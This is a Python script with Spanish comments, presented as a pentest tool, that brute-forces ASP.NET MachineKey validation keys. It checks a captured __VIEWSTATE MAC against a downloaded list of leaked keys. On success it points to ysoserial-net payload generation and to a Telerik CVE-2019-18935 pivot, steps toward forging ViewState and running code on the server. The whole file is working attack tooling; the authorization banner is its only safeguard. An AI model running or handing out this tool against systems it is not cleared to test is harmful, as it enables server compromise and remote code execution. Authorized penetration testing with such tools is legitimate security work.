#!/usr/bin/env python3
"""
machinekey_brute.py — Bruteforce de ASP.NET MachineKey
Uso interactivo o por argumentos:
  python3 machinekey_brute.py
  python3 machinekey_brute.py --vs "VIEWSTATE" --gen "C2EE9ABB" --keys machinekeys.txt
"""

import hmac, hashlib, base64, sys, os, argparse, time
from datetime import datetime

BANNER = """
╔══════════════════════════════════════════════════════╗
║   ASP.NET MachineKey Bruteforcer — Pentest Tool      ║
║   Vector: ViewState MAC validation bypass            ║
║   Solo para uso en entornos con autorización escrita ║
╚══════════════════════════════════════════════════════╝
"""

# ── Algoritmos de validación soportados ──────────────────
ALGOS = {
    "SHA1":    (hashlib.sha1,   20),
    "SHA256":  (hashlib.sha256, 32),
    "SHA384":  (hashlib.sha384, 48),
    "SHA512":  (hashlib.sha512, 64),
    "HMACSHA256": (hashlib.sha256, 32),
}

def pad_base64(s):
    """Añade padding Base64 si falta."""
    return s + '=' * (-len(s) % 4)

def try_key(vs_bytes, generator_bytes, vkey_hex, algo_name="SHA1"):
    """
    Intenta validar el MAC del ViewState con la key dada.
    Retorna True si el MAC coincide.
    """
    try:
        vkey      = bytes.fromhex(vkey_hex.strip())
        hash_fn, mac_len = ALGOS.get(algo_name, (hashlib.sha1, 20))
        if len(vs_bytes) <= mac_len:
            return False
        payload  = vs_bytes[:-mac_len]
        mac_real = vs_bytes[-mac_len:]
        # .NET calcula: HMAC(payload + modifier, validationKey)
        mac_calc = hmac.new(vkey, payload + generator_bytes, hash_fn).digest()
        return hmac.compare_digest(mac_real, mac_calc)
    except Exception:
        return False

def parse_keys_line(line):
    """
    El archivo de Blacklist3r tiene líneas con formato:
    validationKey,decryptionKey  o  solo validationKey
    Devuelve (validationKey, decryptionKey o None)
    """
    parts = line.strip().split(',')
    vk = parts[0].strip() if parts else ''
    dk = parts[1].strip() if len(parts) > 1 else None
    return vk, dk

# ── Helper CLI extra: limpiar ViewState desde clipboard/archivo ───────────────
def clean_viewstate(raw):
    """Limpia un ViewState crudo de Burp (URL-encoded, con saltos, espacios)."""
    s = raw.strip()
    s = s.replace('\n','').replace('\r','').replace('\t','').replace(' ','')
    s = s.replace('%2B','+').replace('%2F','/').replace('%3D','=')
    # Repadding
    s = s + '=' * (-len(s) % 4)
    return s

def bruteforce(vs_b64, generator_hex, keys_file, algo="SHA1", verbose=False):
    """
    Núcleo del bruteforce. Itera el archivo de keys e intenta cada una.
    """
    # Limpiar ViewState: eliminar espacios, saltos de línea, tabs y URL-encoding
    vs_b64 = vs_b64.strip()
    vs_b64 = vs_b64.replace('\n', '').replace('\r', '').replace('\t', '').replace(' ', '')
    vs_b64 = vs_b64.replace('%2B', '+').replace('%2F', '/').replace('%3D', '=')
    vs_b64 = pad_base64(vs_b64)
    print(f"[*] ViewState limpio: {len(vs_b64)} chars")

    # Preparar bytes del ViewState
    try:
        vs_bytes = base64.b64decode(vs_b64)
    except Exception as e:
        print(f"\n[!] Error decodificando ViewState: {e}")
        print(f"    Longitud actual: {len(vs_b64)} chars")
        print(f"    Últimos 10 chars: '{vs_b64[-10:]}'")
        print("\n    Soluciones:")
        print("    1. Guarda el ViewState en archivo desde Burp:")
        print("       Click derecho en el valor → Copy to file → /tmp/vs.txt")
        print("       Luego: python3 machinekey_brute.py --vs-file /tmp/vs.txt ...")
        print("    2. En Burp: selecciona el valor → Decoder → URL decode → copia resultado")
        sys.exit(1)

    # Preparar modifier (VIEWSTATEGENERATOR en bytes)
    try:
        generator_bytes = bytes.fromhex(generator_hex.strip())
    except Exception:
        print(f"\n[!] __VIEWSTATEGENERATOR inválido: '{generator_hex}'")
        print("    Debe ser un string hex de 8 chars, ej: C2EE9ABB")
        sys.exit(1)

    if not os.path.exists(keys_file):
        print(f"\n[!] Archivo de keys no encontrado: {keys_file}")
        print("    Descárgalo con:")
        print("    wget -O machinekeys.txt 'https://raw.githubusercontent.com/NotSoSecure/Blacklist3r/master/MachineKey/AspDotNetWrapper/AspDotNetWrapper/Resource/MachineKeys.txt'")
        sys.exit(1)

    total_lines = sum(1 for _ in open(keys_file))
    print(f"\n[*] ViewState: {len(vs_b64)} chars ({len(vs_bytes)} bytes)")
    print(f"[*] Generator: {generator_hex.upper()}")
    print(f"[*] Algoritmo: {algo}")
    print(f"[*] Keys a probar: {total_lines:,}")
    print(f"[*] Iniciado: {datetime.now().strftime('%H:%M:%S')}")
    print(f"{'─'*54}")

    found = []
    start = time.time()

    with open(keys_file, 'r', errors='ignore') as f:
        for i, line in enumerate(f):
            vk, dk = parse_keys_line(line)
            if len(vk) < 32:
                continue

            # Probar con el algoritmo especificado
            if try_key(vs_bytes, generator_bytes, vk, algo):
                elapsed = time.time() - start
                print(f"\n{'═'*54}")
                print(f"  [+] MATCH ENCONTRADO — línea {i+1}")
                print(f"  [+] validationKey : {vk}")
                if dk:
                    print(f"  [+] decryptionKey : {dk}")
                print(f"  [+] Tiempo        : {elapsed:.1f}s")
                print(f"{'═'*54}")
                found.append({'validationKey': vk, 'decryptionKey': dk, 'line': i+1})

            # Si no encontró con el algo dado, probar otros automáticamente
            elif algo == "SHA1":
                for alt in ["SHA256", "SHA512"]:
                    if try_key(vs_bytes, generator_bytes, vk, alt):
                        print(f"\n[+] MATCH con algoritmo alternativo {alt} — línea {i+1}: {vk}")
                        found.append({'validationKey': vk, 'decryptionKey': dk,
                                      'algo': alt, 'line': i+1})

            # Barra de progreso cada 200 keys
            if i % 200 == 0:
                pct  = i / total_lines * 100
                eta  = (time.time()-start) / max(i,1) * (total_lines-i)
                bar  = '█' * int(pct/5) + '░' * (20 - int(pct/5))
                print(f"  [{bar}] {pct:5.1f}%  {i:>6,}/{total_lines:,}  ETA: {eta:.0f}s  \r",
                      end='', flush=True)

    elapsed = time.time() - start
    print(f"\n{'─'*54}")
    print(f"[*] Finalizado en {elapsed:.1f}s")

    if not found:
        print("[-] No se encontró ninguna MachineKey conocida.")
        print("\n[*] Próximos pasos recomendados:")
        print("    1. Probar con --algo SHA256 o SHA512")
        print("    2. Buscar web.config en subdirectorios: /admin/, /api/, /areas/")
        print("    3. Pivotar a vector BAC via __EVENTTARGET")
        print("    4. Revisar Telerik RadAsyncUpload CVE-2019-18935")
    else:
        print(f"\n[+] {len(found)} key(s) encontrada(s). Siguiente paso:")
        print("    → Verificar con Blacklist3r o ysoserial-net")
        print("    → Generar payload PoC de detección (inofensivo)")
        print("    → Documentar como CRÍTICO en el reporte")

    return found

def interactive_mode():
    """Modo interactivo: pide los valores por consola."""
    print(BANNER)
    print("[*] Modo interactivo — responde las preguntas siguientes\n")

    # ViewState
    print("1. Pega el valor de __VIEWSTATE del POST capturado en Burp")
    print("   (puede ser muy largo — pega todo y presiona Enter dos veces)")
    lines = []
    while True:
        line = input()
        if line == '' and lines:
            break
        lines.append(line)
    vs = ''.join(lines).strip()
    vs = vs.replace('\n','').replace('\r','').replace('\t','').replace(' ','')
    vs = vs.replace('%2B','+').replace('%2F','/').replace('%3D','=')

    # Generator
    print("\n2. Valor de __VIEWSTATEGENERATOR (8 chars hex, ej: C2EE9ABB):")
    gen = input("   > ").strip()

    # Keys file
    default_keys = os.path.expanduser("~/machinekeys.txt")
    print(f"\n3. Ruta al archivo de MachineKeys [{default_keys}]:")
    keys_input = input("   > ").strip()
    keys_file  = keys_input if keys_input else default_keys

    # Algoritmo
    print("\n4. Algoritmo de validación (default: SHA1 — prueba todos si no sabes):")
    print("   Opciones: SHA1, SHA256, SHA384, SHA512")
    algo_input = input("   > ").strip().upper()
    algo = algo_input if algo_input in ALGOS else "SHA1"

    print(f"\n[*] Configuración lista:")
    print(f"    ViewState : {vs[:60]}{'...' if len(vs)>60 else ''}")
    print(f"    Generator : {gen}")
    print(f"    Keys file : {keys_file}")
    print(f"    Algoritmo : {algo}")
    print("\n[*] ¿Iniciar bruteforce? [S/n]")
    confirm = input("   > ").strip().lower()
    if confirm == 'n':
        print("[!] Abortado.")
        sys.exit(0)

    return bruteforce(vs, gen, keys_file, algo)

def main():
    # Modo --clean: limpiar ViewState antes del argparse
    if len(sys.argv) >= 3 and sys.argv[1] == "--clean":
        src = sys.argv[2]
        raw = open(src).read() if os.path.exists(src) else src
        cleaned = clean_viewstate(raw)
        out = "/tmp/vs_clean.txt"
        with open(out, "w") as f: f.write(cleaned)
        print(f"[+] Guardado en {out} ({len(cleaned)} chars)")
        try:
            base64.b64decode(cleaned)
            print("[+] Base64 válido ✓ — usa: --vs-file /tmp/vs_clean.txt")
        except Exception as e:
            print(f"[!] Aún inválido: {e}")
        sys.exit(0)
    parser = argparse.ArgumentParser(
        description="ASP.NET MachineKey Bruteforcer — Pentest Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  # Modo interactivo (recomendado):
  python3 machinekey_brute.py

  # Modo argumento directo:
  python3 machinekey_brute.py --vs "/wEPDwUK..." --gen "C2EE9ABB" --keys ~/machinekeys.txt

  # Especificar algoritmo:
  python3 machinekey_brute.py --vs "..." --gen "C2EE9ABB" --keys keys.txt --algo SHA256

  # ViewState desde archivo (útil cuando es muy largo):
  python3 machinekey_brute.py --vs-file /tmp/vs.txt --gen "C2EE9ABB" --keys keys.txt
        """
    )
    parser.add_argument('--vs',      help='Valor de __VIEWSTATE en Base64')
    parser.add_argument('--vs-file', help='Archivo con el valor de __VIEWSTATE')
    parser.add_argument('--gen',     help='Valor de __VIEWSTATEGENERATOR (hex 8 chars)')
    parser.add_argument('--keys',    default=os.path.expanduser('~/machinekeys.txt'),
                                     help='Ruta al archivo de MachineKeys (default: ~/machinekeys.txt)')
    parser.add_argument('--algo',    default='SHA1',
                                     choices=list(ALGOS.keys()),
                                     help='Algoritmo de validación (default: SHA1)')
    parser.add_argument('--verbose', action='store_true', help='Salida detallada')

    args = parser.parse_args()

    # Si no se pasan argumentos → modo interactivo
    if not args.vs and not args.vs_file:
        interactive_mode()
        return

    # Modo argumento
    print(BANNER)
    if args.vs_file:
        with open(args.vs_file) as f:
            vs = f.read().strip()
    else:
        vs = args.vs

    if not args.gen:
        print("[!] Falta --gen (valor de __VIEWSTATEGENERATOR)")
        parser.print_help()
        sys.exit(1)

    bruteforce(vs, args.gen, args.keys, args.algo, args.verbose)

if __name__ == '__main__':
    main()



if __name__ == '__main__' and len(sys.argv) >= 3 and sys.argv[1] == '--clean':
    src = sys.argv[2]
    raw = open(src).read() if os.path.exists(src) else src
    cleaned = clean_viewstate(raw)
    out = '/tmp/vs_clean.txt'
    with open(out, 'w') as f:
        f.write(cleaned)
    print(f"[+] ViewState limpio guardado en {out}")
    print(f"[+] Longitud: {len(cleaned)} chars")
    print(f"[+] Primeros 40 chars: {cleaned[:40]}...")
    try:
        import base64 as b64
        b64.b64decode(cleaned)
        print("[+] Base64 válido ✓ — listo para usar con --vs-file /tmp/vs_clean.txt")
    except Exception as e:
        print(f"[!] Aún inválido: {e}")
    sys.exit(0)
